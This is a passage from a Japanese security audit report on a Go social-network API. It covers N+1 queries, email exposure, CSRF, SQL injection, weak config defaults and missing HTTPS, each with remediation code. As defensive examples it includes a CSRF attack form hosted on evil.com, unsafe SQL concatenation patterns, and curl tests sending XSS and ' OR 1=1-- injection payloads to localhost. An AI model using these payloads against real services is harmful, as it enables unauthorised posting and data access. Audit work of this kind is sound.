    }

    // 7. データベースに記録
    media := &models.Media{
        PostID:    postID,
        MediaType: "image",
        MediaURL:  "/uploads/" + safeFilename,
        FileSize:  file.Size,
    }

    // ...
}
```

**対応期限**: Phase 2 実装時に必須実装

---

### 11. データベースクエリでの N+1 問題

**重要度**: 🟠 High
**Phase**: Phase 1
**影響範囲**: パフォーマンス

#### 問題のあるコード

**ファイル**: `backend/internal/services/post_service.go:54-63`

```go
// いいね数・コメント数を集計
for i := range posts {
    db.Model(&models.PostLike{}).Where("post_id = ?", posts[i].ID).Count(&posts[i].LikesCount)
    db.Model(&models.Comment{}).Where("post_id = ?", posts[i].ID).Count(&posts[i].CommentsCount)

    // ログインユーザーのいいね状態をチェック
    if userID != nil {
        var count int64
        db.Model(&models.PostLike{}).Where("post_id = ? AND user_id = ?", posts[i].ID, *userID).Count(&count)
        posts[i].IsLiked = count > 0
    }
}
```

#### リスク

- **パフォーマンス低下**: 20件の投稿で40〜60クエリ実行
- **データベース過負荷**: 同時ユーザーが増えると深刻
- **レスポンス時間増加**: ユーザー体験の悪化
- **DoS攻撃のベクトル**: 意図的に大量データ取得で負荷をかけられる

#### クエリ数の例

```
1投稿あたり:
- いいね数カウント: 1クエリ
- コメント数カウント: 1クエリ
- いいね状態チェック: 1クエリ
= 合計3クエリ

20投稿の場合:
- タイムライン取得: 1クエリ
- ループ内: 3 × 20 = 60クエリ
= 合計61クエリ 🔥
```

#### 推奨対策

**方法1: サブクエリで一括取得**

```go
func GetTimeline(userID *uint, timelineType string, limit int, cursor *string) ([]models.Post, bool, string, error) {
    db := database.GetDB()

    query := db.Model(&models.Post{}).
        Preload("User").
        Preload("Media")

    // タイムラインタイプによるフィルタリング
    if timelineType == "following" && userID != nil {
        query = query.Joins("INNER JOIN follows ON follows.following_id = posts.user_id").
            Where("follows.follower_id = ?", *userID)
    }

    // カーソルベースページネーション
    if cursor != nil && *cursor != "" {
        cursorID, err := strconv.ParseUint(*cursor, 10, 64)
        if err == nil {
            query = query.Where("posts.id < ?", cursorID)
        }
    }

    var posts []models.Post
    if err := query.Order("posts.created_at DESC").Limit(limit + 1).Find(&posts).Error; err != nil {
        return nil, false, "", err
    }

    hasMore := len(posts) > limit
    if hasMore {
        posts = posts[:limit]
    }

    nextCursor := ""
    if hasMore && len(posts) > 0 {
        nextCursor = fmt.Sprintf("%d", posts[len(posts)-1].ID)
    }

    // ✅ 改善: 一括でカウント取得
    if len(posts) > 0 {
        postIDs := make([]uint, len(posts))
        for i := range posts {
            postIDs[i] = posts[i].ID
        }

        // いいね数を一括取得
        type CountResult struct {
            PostID uint
            Count  int64
        }

        var likeCounts []CountResult
        db.Model(&models.PostLike{}).
            Select("post_id, COUNT(*) as count").
            Where("post_id IN ?", postIDs).
            Group("post_id").
            Find(&likeCounts)

        // マップに変換
        likeCountMap := make(map[uint]int64)
        for _, lc := range likeCounts {
            likeCountMap[lc.PostID] = lc.Count
        }

        // コメント数を一括取得
        var commentCounts []CountResult
        db.Model(&models.Comment{}).
            Select("post_id, COUNT(*) as count").
            Where("post_id IN ?", postIDs).
            Group("post_id").
            Find(&commentCounts)

        commentCountMap := make(map[uint]int64)
        for _, cc := range commentCounts {
            commentCountMap[cc.PostID] = cc.Count
        }

        // いいね状態を一括取得
        var likedPostIDs []uint
        if userID != nil {
            db.Model(&models.PostLike{}).
                Select("post_id").
                Where("post_id IN ? AND user_id = ?", postIDs, *userID).
                Find(&likedPostIDs)
        }

        likedMap := make(map[uint]bool)
        for _, id := range likedPostIDs {
            likedMap[id] = true
        }

        // 投稿に集計結果を設定
        for i := range posts {
            posts[i].LikesCount = likeCountMap[posts[i].ID]
            posts[i].CommentsCount = commentCountMap[posts[i].ID]
            posts[i].IsLiked = likedMap[posts[i].ID]
        }
    }

    return posts, hasMore, nextCursor, nil
}
```

**改善結果**:

```
20投稿の場合:
- タイムライン取得: 1クエリ
- いいね数一括取得: 1クエリ
- コメント数一括取得: 1クエリ
- いいね状態一括取得: 1クエリ
= 合計4クエリ ✅ (61クエリ → 4クエリ)
```

**同様の修正が必要な箇所**:
- ✅ `services/post_service.go:GetPostByID()` - 1件なので影響小
- ✅ `services/post_service.go:GetUserPosts()` - 同様のN+1問題
- ✅ `services/comment_service.go` - コメント一覧でも同様の可能性

**対応期限**: Phase 1 完了前（パフォーマンス改善）

---

### 12. 論理削除されたデータへのアクセス

**重要度**: 🟠 High
**Phase**: Phase 1
**影響範囲**: データ整合性

#### 現状確認

GORMの`gorm.DeletedAt`を使用している箇所:
- `models/user.go:25` - User
- `models/post.go` - Post
- `models/comment.go` - Comment

#### リスク

- JOINクエリで削除済みデータが含まれる可能性
- リレーション先の削除状態が考慮されない
- 削除済みユーザーの投稿が表示される

#### 確認が必要なクエリ

**ファイル**: `backend/internal/services/post_service.go:24`

```go
query = query.Joins("INNER JOIN follows ON follows.following_id = posts.user_id").
    Where("follows.follower_id = ?", *userID)
```

このクエリでは：
- `posts`テーブルの`deleted_at`は自動チェックされる ✅
- `follows`テーブルの`deleted_at`は自動チェックされる ✅
- しかし、結合先の`users`テーブルはチェックされない可能性 ⚠️

#### 推奨対策

**ステップ1**: 削除済みユーザーの投稿を非表示

```go
func GetTimeline(userID *uint, timelineType string, limit int, cursor *string) ([]models.Post, bool, string, error) {
    db := database.GetDB()

    query := db.Model(&models.Post{}).
        Preload("User").  // ここで削除済みユーザーをフィルタ
        Preload("Media")

    // タイムラインタイプによるフィルタリング
    if timelineType == "following" && userID != nil {
        // ✅ 改善: 削除済みユーザーを除外
        query = query.
            Joins("INNER JOIN follows ON follows.following_id = posts.user_id AND follows.deleted_at IS NULL").
            Joins("INNER JOIN users ON users.id = posts.user_id AND users.deleted_at IS NULL").
            Where("follows.follower_id = ?", *userID)
    } else {
        // ✅ 全体タイムラインでも削除済みユーザーを除外
        query = query.
            Joins("INNER JOIN users ON users.id = posts.user_id AND users.deleted_at IS NULL")
    }

    // ... 残りのコード
}
```

**ステップ2**: Preloadでの削除済みデータフィルタ

GORMはPreloadで自動的に`deleted_at`をチェックしますが、明示的に指定することも可能:

```go
query := db.Model(&models.Post{}).
    Preload("User", "deleted_at IS NULL").  // 明示的に削除済みを除外
    Preload("Media")
```

**ステップ3**: テストケース追加

```go
// services/post_service_test.go
func TestGetTimeline_DoesNotIncludeDeletedUserPosts(t *testing.T) {
    // 1. ユーザー作成
    user := createTestUser()

    // 2. 投稿作成
    post := createTestPost(user.ID)

    // 3. ユーザー削除
    db.Delete(&user)

    // 4. タイムライン取得
    posts, _, _, err := GetTimeline(nil, "all", 10, nil)

    // 5. 削除済みユーザーの投稿が含まれないことを確認
    assert.NoError(t, err)
    for _, p := range posts {
        assert.NotEqual(t, post.ID, p.ID)
    }
}
```

**対応期限**: Phase 1 完了前

---

### 13. メールアドレスが公開される

**重要度**: 🟠 High
**Phase**: Phase 1
**影響範囲**: プライバシー

#### 問題のあるコード

**ファイル**: `backend/internal/models/user.go:56-70`

```go
type PublicUser struct {
    ID            uint       `json:"id"`
    Email         string     `json:"email"`  // ⚠️ 公開情報に含まれる
    Username      string     `json:"username"`
    DisplayName   *string    `json:"display_name"`
    // ...
}
```

#### リスク

- スパムメール送信
- フィッシング攻撃
- プライバシー侵害
- GDPR/個人情報保護法違反の可能性
- 他のサービスでのアカウント特定

#### 現状の影響範囲

以下のエンドポイントでメールアドレスが公開:
- `GET /api/v1/users/:username` - 他人のメールアドレスが見える
- `GET /api/v1/auth/me` - 本人のみ（これは問題なし）
- `GET /api/v1/users/:username/followers` - フォロワーのメールが見える
- `GET /api/v1/users/:username/following` - フォロー中のメールが見える

#### 推奨対策

**方法1: メールアドレスを完全に非公開**

```go
type PublicUser struct {
    ID            uint       `json:"id"`
    // Email フィールドを削除 ✅
    Username      string     `json:"username"`
    DisplayName   *string    `json:"display_name"`
    Bio           *string    `json:"bio"`
    AvatarURL     *string    `json:"avatar_url"`
    HeaderURL     *string    `json:"header_url"`
    Website       *string    `json:"website"`
    BirthDate     *time.Time `json:"birth_date"`
    Occupation    *string    `json:"occupation"`
    EmailVerified bool       `json:"email_verified"`
    CreatedAt     time.Time  `json:"created_at"`
    UpdatedAt     time.Time  `json:"updated_at"`
}
```

**方法2: 本人のみメールアドレスを表示（推奨）**

```go
// ToPublicUser - Userを PublicUserに変換（閲覧者を考慮）
func (u *User) ToPublicUser(viewerID *uint) *PublicUser {
    publicUser := &PublicUser{
        ID:            u.ID,
        Username:      u.Username,
        DisplayName:   u.DisplayName,
        Bio:           u.Bio,
        AvatarURL:     u.AvatarURL,
        HeaderURL:     u.HeaderURL,
        Website:       u.Website,
        BirthDate:     u.BirthDate,
        Occupation:    u.Occupation,
        EmailVerified: u.EmailVerified,
        CreatedAt:     u.CreatedAt,
        UpdatedAt:     u.UpdatedAt,
    }

    // 本人のみメールアドレスを含める
    if viewerID != nil && *viewerID == u.ID {
        publicUser.Email = &u.Email
    }

    return publicUser
}
```

PublicUser構造体を更新:
```go
type PublicUser struct {
    ID            uint       `json:"id"`
    Email         *string    `json:"email,omitempty"`  // オプショナル
    Username      string     `json:"username"`
    // ... 残りのフィールド
}
```

**ハンドラーの更新**:

```go
// handlers/user_handler.go
func GetUserByUsername(c echo.Context) error {
    username := c.Param("username")

    // 現在のユーザーID取得
    var currentUserIDPtr *uint
    if userID, ok := c.Get("user_id").(uint); ok {
        currentUserIDPtr = &userID
    }

    user, err := services.GetUserByUsername(username, currentUserIDPtr)
    if err != nil {
        if err.Error() == "user not found" {
            return utils.ErrorResponse(c, 404, err.Error())
        }
        return utils.ErrorResponse(c, 500, "Failed to get user")
    }

    // ✅ 改善: viewerIDを渡す
    return utils.SuccessResponse(c, 200, user.ToPublicUser(currentUserIDPtr))
}
```

**auth_handler.go も更新**:

```go
func GetMe(c echo.Context) error {
    userID := c.Get("user_id").(uint)

    user, err := services.GetCurrentUser(userID)
    if err != nil {
        if err.Error() == "user not found" {
            return utils.ErrorResponse(c, 404, err.Error())
        }
        return utils.ErrorResponse(c, 500, "Failed to get user")
    }

    // 自分自身なのでメールアドレスを含める
    return utils.SuccessResponse(c, 200, user.ToPublicUser(&userID))
}
```

**対応期限**: Phase 1 完了前に必須

---

## 🟡 Medium（中優先度）

### 14. CSRF 対策が未実装

**重要度**: 🟡 Medium
**Phase**: Phase 1
**影響範囲**: API セキュリティ

#### 現状

現在の実装ではCSRF（Cross-Site Request Forgery）対策がありません。

#### リスク評価

**JWTベースのAPI**: ✅ 影響は限定的

現在の実装では：
- JWTを`Authorization`ヘッダーで送信
- Cookieを使用していない
- ブラウザがクロスドメインでAuthorizationヘッダーを自動送信しない

**しかし、将来的に以下を実装する場合は危険**:
- Cookieベースのセッション
- 自動ログイン機能
- `withCredentials: true`でのCookie送信

#### 攻撃シナリオ（Cookieを使用した場合）

```html
<!-- 攻撃者のサイト evil.com -->
<form action="https://yourapi.com/api/v1/posts" method="POST">
    <input type="hidden" name="content" value="このサイトをフォローしてください！http://evil.com">
</form>
<script>
    document.forms[0].submit();
</script>
<!-- ユーザーのCookieが自動送信され、勝手に投稿される -->
```

#### 推奨対策

**Phase 1 での対応**: 現在のJWT実装を維持

```
✅ Authorization ヘッダーのみでJWT送信
❌ Cookieでのトークン保存は避ける
```

**Phase 2 以降でCookieを使用する場合**: CSRFトークン実装

```bash
docker compose exec api go get github.com/labstack/echo/v4/middleware
```

```go
// middleware/csrf.go
import (
    "github.com/labstack/echo/v4"
    "github.com/labstack/echo/v4/middleware"
)

func CSRF() echo.MiddlewareFunc {
    return middleware.CSRFWithConfig(middleware.CSRFConfig{
        TokenLookup: "header:X-CSRF-Token",
        CookieName:  "_csrf",
        CookiePath:  "/",
        CookieHTTPOnly: true,
        CookieSameSite: http.SameSiteStrictMode,
    })
}
```

**対応期限**: Cookieを使用する場合のみ実装

---

### 15. SQL インジェクションリスク（低いが注意）

**重要度**: 🟡 Medium
**Phase**: Phase 1
**影響範囲**: データベースクエリ

#### 現状評価

✅ **現在の実装は安全**

GORMがプリペアドステートメントを使用しているため、SQLインジェクションのリスクは低い。

#### 安全なクエリ例

**ファイル**: `backend/internal/services/post_service.go:32`

```go
// ✅ 安全: プリペアドステートメント使用
query = query.Where("posts.id < ?", cursorID)
```

**ファイル**: `backend/internal/services/auth_service.go:17`

```go
// ✅ 安全: プリペアドステートメント使用
if err := db.Where("email = ?", email).First(&existingUser).Error; err == nil {
    return nil, errors.New("email already exists")
}
```

#### 注意が必要なケース

**❌ 危険なパターン（使用しないこと）**:

```go
// ❌ Raw SQLで直接文字列結合（絶対にしない）
db.Exec(fmt.Sprintf("SELECT * FROM users WHERE email = '%s'", email))

// ❌ Raw SQLでユーザー入力を使用
db.Raw("SELECT * FROM posts WHERE content LIKE '%" + keyword + "%'")
```

**✅ 安全なパターン（推奨）**:

```go
// ✅ プリペアドステートメント使用
db.Where("email = ?", email).Find(&users)

// ✅ LIKE検索も安全
db.Where("content LIKE ?", "%"+keyword+"%").Find(&posts)

// ✅ Raw SQLでもプレースホルダー使用
db.Raw("SELECT * FROM posts WHERE content LIKE ?", "%"+keyword+"%").Scan(&posts)
```

#### 推奨対策

**コーディング規約**:

```
✅ 必ず GORM のクエリビルダーを使用
✅ Raw SQL が必要な場合はプレースホルダー (?) を使用
❌ fmt.Sprintf や文字列結合でクエリを作成しない
❌ ユーザー入力を直接クエリに埋め込まない
```

**コードレビューチェックリスト**:

```go
// .Exec(), .Raw() を使用している箇所を確認
// grep -r "\.Exec\|\.Raw" backend/internal/services/
```

**対応期限**: 継続的なコードレビューで確認

---

### 16. 環境変数のデフォルト値が安全でない

**重要度**: 🟡 Medium
**Phase**: Phase 1
**影響範囲**: 設定管理

#### 問題のあるコード

**ファイル**: `backend/internal/config/config.go:30-38`

```go
config := &Config{
    DBHost:     getEnv("DB_HOST", "localhost"),
    DBPort:     getEnv("DB_PORT", "5432"),
    DBUser:     getEnv("DB_USER", "postgres"),
    DBPassword: getEnv("DB_PASSWORD", "postgres"),  // ⚠️ 弱いデフォルト
    DBName:     getEnv("DB_NAME", "sns_db"),
    JWTSecret:  getEnv("JWT_SECRET", "secret"),     // ⚠️ 危険なデフォルト
    Port:       getEnv("PORT", "8080"),
    Env:        getEnv("ENV", "development"),
}
```

#### リスク

- 環境変数が設定されていない場合に脆弱な値が使用される
- 本番環境で誤ってデフォルト値が使用される
- セキュリティ意識の低下

#### 推奨対策

**方法1: 重要な値はデフォルトを設定しない**

```go
func LoadConfig() *Config {
    if err := godotenv.Load(); err != nil {
        log.Println("Warning: .env file not found, using environment variables")
    }

    // 重要な環境変数のチェック
    jwtSecret := getEnv("JWT_SECRET", "")
    if jwtSecret == "" {
        log.Fatal("❌ JWT_SECRET environment variable is required")
    }

    dbPassword := getEnv("DB_PASSWORD", "")
    if dbPassword == "" && getEnv("ENV", "development") == "production" {
        log.Fatal("❌ DB_PASSWORD environment variable is required in production")
    }

    config := &Config{
        DBHost:     getEnv("DB_HOST", "localhost"),
        DBPort:     getEnv("DB_PORT", "5432"),
        DBUser:     getEnv("DB_USER", "postgres"),
        DBPassword: getEnvOrDefault(dbPassword, "postgres"),  // 開発環境のみデフォルト
        DBName:     getEnv("DB_NAME", "sns_db"),
        JWTSecret:  jwtSecret,  // デフォルトなし
        Port:       getEnv("PORT", "8080"),
        Env:        getEnv("ENV", "development"),
    }

    AppConfig = config
    return config
}

// getEnvOrDefault - 環境に応じてデフォルト値を返す
func getEnvOrDefault(value, defaultValue string) string {
    if value != "" {
        return value
    }

    env := os.Getenv("ENV")
    if env == "production" {
        log.Fatal("❌ Required environment variable not set in production")
    }

    return defaultValue
}
```

**方法2: 環境変数チェック関数**

```go
// ValidateConfig - 設定を検証
func (c *Config) Validate() error {
    if c.Env == "production" {
        // 本番環境での必須チェック
        if c.JWTSecret == "secret" || len(c.JWTSecret) < 32 {
            return errors.New("JWT_SECRET must be set and strong in production")
        }

        if c.DBPassword == "postgres" {
            return errors.New("DB_PASSWORD must be changed in production")
        }
    }

    return nil
}

func LoadConfig() *Config {
    // ...

    if err := config.Validate(); err != nil {
        log.Fatal("❌ Configuration validation failed:", err)
    }

    return config
}
```

**対応期限**: Phase 1 完了前

---

### 17. HTTPS が強制されていない

**重要度**: 🟡 Medium
**Phase**: Phase 1
**影響範囲**: 通信セキュリティ

#### 現状

現在、HTTPSリダイレクトやセキュリティヘッダーが設定されていません。

#### リスク

**本番環境でHTTPを使用した場合**:
- 通信内容の盗聴
- JWTトークンの窃取
- パスワードの平文送信
- 中間者攻撃（MITM）

#### 推奨対策

**ステップ1: セキュリティミドルウェア追加**

`backend/cmd/server/main.go`
```go
import (
    echoMiddleware "github.com/labstack/echo/v4/middleware"
)

func main() {
    // ...
    e := echo.New()

    // 本番環境でのセキュリティ強化
    if cfg.Env == "production" {
        // HTTPSリダイレクト
        e.Pre(echoMiddleware.HTTPSRedirect())

        // セキュリティヘッダー
        e.Use(echoMiddleware.SecureWithConfig(echoMiddleware.SecureConfig{
            XSSProtection:         "1; mode=block",
            ContentTypeNosniff:    "nosniff",
            XFrameOptions:         "SAMEORIGIN",
            HSTSMaxAge:            31536000,  // 1年
            HSTSExcludeSubdomains: false,
            ContentSecurityPolicy: "default-src 'self'",
        }))
    }

    // 既存のミドルウェア
    e.Use(echoMiddleware.Logger())
    e.Use(echoMiddleware.Recover())
    e.Use(customMiddleware.CORS())

    // ...
}
```

**ステップ2: レスポンスヘッダー確認**

本番環境で以下のヘッダーが設定されることを確認:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
```

**ステップ3: インフラ側での強制**

多くのホスティングサービスでは自動的にHTTPS化されます:

- **Render**: 自動HTTPS
- **Google Cloud Run**: 自動HTTPS
- **Vercel**: 自動HTTPS
- **Heroku**: 自動HTTPS

**対応期限**: 本番デプロイ前

---

### 18. セッション管理機構がない

**重要度**: 🟡 Medium
**Phase**: Phase 2 推奨
**影響範囲**: ユーザー体験

#### 現状

現在の実装では:
- JWTが発行されたら有効期限まで有効
- ログアウト機能がない
- デバイスごとのセッション管理ができない
- トークンの無効化ができない

#### リスク

- デバイスを紛失した場合にログアウトできない
- パスワード変更後も古いトークンが有効
- 不正アクセスを検知してもトークンを無効化できない

#### Phase 2 での推奨実装

**セッションテーブル追加**:

`backend/internal/models/session.go`
```go
package models

import (
    "time"
    "gorm.io/gorm"
)

type Session struct {
    ID         uint           `gorm:"primarykey" json:"id"`
    UserID     uint           `gorm:"not null;index" json:"user_id"`
    Token      string         `gorm:"uniqueIndex;not null" json:"-"`
    DeviceInfo string         `gorm:"type:varchar(200)" json:"device_info"`
    IPAddress  string         `gorm:"type:varchar(45)" json:"ip_address"`
    ExpiresAt  time.Time      `gorm:"not null;index" json:"expires_at"`
    LastUsedAt time.Time      `json:"last_used_at"`
    CreatedAt  time.Time      `json:"created_at"`
    RevokedAt  *time.Time     `json:"revoked_at"`
    DeletedAt  gorm.DeletedAt `gorm:"index" json:"-"`

    User User `gorm:"foreignKey:UserID" json:"-"`
}
```

**ログアウト機能**:

```go
// POST /api/v1/auth/logout
func Logout(c echo.Context) error {
    token := extractTokenFromHeader(c)

    // セッションを無効化
    if err := services.RevokeSession(token); err != nil {
        return utils.ErrorResponse(c, 500, "Failed to logout")
    }

    return utils.SuccessResponse(c, 200, map[string]string{
        "message": "Logged out successfully",
    })
}

// POST /api/v1/auth/logout-all
func LogoutAllDevices(c echo.Context) error {
    userID := c.Get("user_id").(uint)

    // すべてのセッションを無効化
    if err := services.RevokeAllSessions(userID); err != nil {
        return utils.ErrorResponse(c, 500, "Failed to logout")
    }

    return utils.SuccessResponse(c, 200, map[string]string{
        "message": "Logged out from all devices",
    })
}
```

**対応期限**: Phase 2

---

### 19. 監査ログがない

**重要度**: 🟡 Medium
**Phase**: Phase 2 推奨
**影響範囲**: セキュリティ監視

#### 現状

以下の重要なアクションが記録されていません:
- ユーザー登録
- ログイン/ログアウト
- パスワード変更
- 投稿の作成/削除
- 管理者操作

#### リスク

- セキュリティインシデント発生時に追跡不可能
- 不正アクセスの検知が困難
- コンプライアンス要件を満たせない
- フォレンジック調査ができない

#### Phase 2 での推奨実装

**監査ログテーブル**:

`backend/internal/models/audit_log.go`
```go
package models

import "time"

type AuditLog struct {
    ID        uint      `gorm:"primarykey" json:"id"`
    UserID    *uint     `gorm:"index" json:"user_id"`  // nilの場合は未認証
    Action    string    `gorm:"type:varchar(100);not null;index" json:"action"`
    Resource  string    `gorm:"type:varchar(100)" json:"resource"`
    ResourceID *uint    `json:"resource_id"`
    IPAddress string    `gorm:"type:varchar(45)" json:"ip_address"`
    UserAgent string    `gorm:"type:varchar(200)" json:"user_agent"`
    Details   string    `gorm:"type:jsonb" json:"details"`
    CreatedAt time.Time `gorm:"index" json:"created_at"`
}
```

**ログ記録例**:

```go
// ログイン成功
auditLog := &models.AuditLog{
    UserID:     &user.ID,
    Action:     "auth.login",
    IPAddress:  c.RealIP(),
    UserAgent:  c.Request().UserAgent(),
    CreatedAt:  time.Now(),
}
db.Create(auditLog)

// 投稿作成
auditLog := &models.AuditLog{
    UserID:     &userID,
    Action:     "post.create",
    Resource:   "post",
    ResourceID: &post.ID,
    IPAddress:  c.RealIP(),
    UserAgent:  c.Request().UserAgent(),
    CreatedAt:  time.Now(),
}
db.Create(auditLog)
```

**対応期限**: Phase 2

---

### 20. パスワードリセット機能がない

**重要度**: 🟡 Medium
**Phase**: Phase 2 推奨
**影響範囲**: ユーザー体験

#### 現状

パスワードを忘れた場合の復旧手段がありません。

#### リスク

- アカウントロックアウト
- サポートコスト増加
- ユーザー離脱

#### Phase 2 での推奨実装

**パスワードリセットトークンテーブル**:

```go
type PasswordResetToken struct {
    ID        uint      `gorm:"primarykey"`
    UserID    uint      `gorm:"not null;index"`
    Token     string    `gorm:"uniqueIndex;not null"`
    ExpiresAt time.Time `gorm:"not null"`
    UsedAt    *time.Time
    CreatedAt time.Time
}
```

**フロー**:
1. `POST /auth/forgot-password` - メール送信
2. メール内のリンクをクリック
3. `POST /auth/reset-password` - 新しいパスワード設定

**対応期限**: Phase 2

---

## 🟢 Low（低優先度）

### 21. ユーザー名の制約が緩い

**重要度**: 🟢 Low
**Phase**: Phase 1

#### 現状

`backend/internal/handlers/auth_handler.go:13`
```go
Username string `json:"username" validate:"required,min=3,max=50"`
```

現在は文字種制限がないため、以下が許可されます:
- `user@#$%`
- `ユーザー名`
- `user name` (スペース含む)

#### 推奨

```go
Username string `json:"username" validate:"required,min=3,max=50,alphanum_underscore"`
```

カスタムバリデーター:
```go
func ValidateUsername(fl validator.FieldLevel) bool {
    username := fl.Field().String()
    matched, _ := regexp.MatchString(`^[a-zA-Z0-9_]+$`, username)
    return matched
}
```

---

### 22. タイムゾーン考慮不足

**重要度**: 🟢 Low
**Phase**: Phase 1

#### 現状

すべての時刻は`time.Now()`で取得されており、サーバーのタイムゾーンに依存します。

#### 推奨

```go
// UTC統一
time.Now().UTC()

// データベース設定も UTC
// PostgreSQL は通常 UTC がデフォルト
```

---

### 23. ページネーション上限チェック

**重要度**: 🟢 Low
**Phase**: Phase 1

#### 現状

✅ 既に実装済み

`backend/internal/handlers/post_handler.go:44`
```go
if l, err := strconv.Atoi(limitStr); err == nil && l > 0 && l <= 100 {
    limit = l
}
```

---

### 24. データベース接続の SSL 無効

**重要度**: 🟢 Low
**Phase**: Phase 1

#### 現状

`backend/internal/config/config.go:47`
```go
"host=%s port=%s user=%s password=%s dbname=%s sslmode=disable",
```

#### 推奨

本番環境では:
```go
func (c *Config) GetDSN() string {
    sslMode := "disable"
    if c.Env == "production" {
        sslMode = "require"
    }

    return fmt.Sprintf(
        "host=%s port=%s user=%s password=%s dbname=%s sslmode=%s",
        c.DBHost, c.DBPort, c.DBUser, c.DBPassword, c.DBName, sslMode,
    )
}
```

---

### 25. バージョン情報の露出

**重要度**: 🟢 Low
**Phase**: Phase 1

#### 現状

`backend/cmd/server/main.go:19`
```go
// @version 1.0
```

Swagger UIでバージョン情報が公開されます。

#### リスク

攻撃者がバージョン固有の脆弱性を悪用する可能性（低い）

#### 推奨

本番環境ではSwagger UIを無効化:
```go
if cfg.Env != "production" {
    e.GET("/swagger/*", echoSwagger.WrapHandler)
}
```

---

## 📊 総合評価

### セキュリティスコア（Phase 1）

| カテゴリ | 現状スコア | 改善後スコア | 主要課題 |
|---------|-----------|-------------|---------|
| **認証・認可** | 4/10 ⚠️ | 8/10 ✅ | JWT Secret, 有効期限, レート制限 |
| **入力検証** | 5/10 ⚠️ | 8/10 ✅ | XSS対策, URLバリデーション |
| **データ保護** | 5/10 ⚠️ | 7/10 ✅ | メール公開, エラー情報漏洩 |
| **API セキュリティ** | 3/10 ❌ | 7/10 ✅ | レート制限, CORS, HTTPS |
| **インフラ** | 4/10 ⚠️ | 6/10 ⚠️ | SSL, セキュリティヘッダー |
| **総合** | **4.2/10** | **7.2/10** | Critical 課題の解決で大幅改善 |

---

## 🎯 優先対応リスト（Phase 1 完了前に必須）

### 即座対応（今日中）

- [ ] **#1** JWT Secretをランダム値に変更
- [ ] **#16** 環境変数のデフォルト値を削除

### 1週間以内

- [ ] **#2** レート制限実装（認証、投稿作成）
- [ ] **#4** XSS対策（入力サニタイゼーション）
- [ ] **#5** 型アサーションの安全化
- [ ] **#3** エラーハンドリング改善
- [ ] **#13** メールアドレス非公開化

### Phase 1 完了前

- [ ] **#6** CORS設定を環境変数化
- [ ] **#7** パスワードポリシー強化
- [ ] **#8** JWT有効期限短縮（15分）
- [ ] **#9** URLバリデーション追加
- [ ] **#11** N+1問題の解消
- [ ] **#12** 論理削除データの除外確認

### Phase 2 で対応

- [ ] **#17** HTTPS強制
- [ ] **#18** セッション管理実装
- [ ] **#19** 監査ログ実装
- [ ] **#20** パスワードリセット機能
- [ ] **#10** ファイルアップロードセキュリティ

---

## 🛠️ 推奨ツール・ライブラリ

```bash
# Phase 1 で追加推奨
docker compose exec api go get github.com/ulule/limiter/v3              # レート制限
docker compose exec api go get github.com/microcosm-cc/bluemonday       # HTMLサニタイゼーション

# Phase 2 で追加推奨
docker compose exec api go get golang.org/x/crypto/argon2               # パスワードハッシュ強化
docker compose exec api go get github.com/google/uuid                   # セキュアなID生成
```

---

## 🧪 セキュリティテスト

### Phase 1 完了前に実施すべきテスト

```bash
# 1. レート制限テスト
for i in {1..10}; do
  curl -X POST http://localhost:8080/api/v1/auth/login \
    -d '{"email":"test@test.com","password":"wrong"}'
done
# → 5回目以降でレート制限エラーが返ることを確認

# 2. XSSテスト
curl -X POST http://localhost:8080/api/v1/posts \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"content":"<script>alert(1)</script>"}'
# → スクリプトタグがエスケープされていることを確認

# 3. SQLインジェクションテスト
curl -X POST http://localhost:8080/api/v1/auth/login \
  -d '{"email":"admin@test.com'\'' OR 1=1--","password":"test"}'
# → エラーが返り、ログインできないことを確認
```

---

## 📚 参考資料

- **OWASP Top 10 2021**: https://owasp.org/Top10/
- **Go Security Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Go_Security_Cheat_Sheet.html
- **JWT Best Practices**: https://tools.ietf.org/html/rfc8725
- **OWASP API Security Top 10**: https://owasp.org/API-Security/

---

## 📞 サポート

このレポートに関する質問や、修正実装のサポートが必要な場合はお知らせください。

**調査完了日**: 2026-02-15
**次回調査推奨**: Phase 2 開発開始前
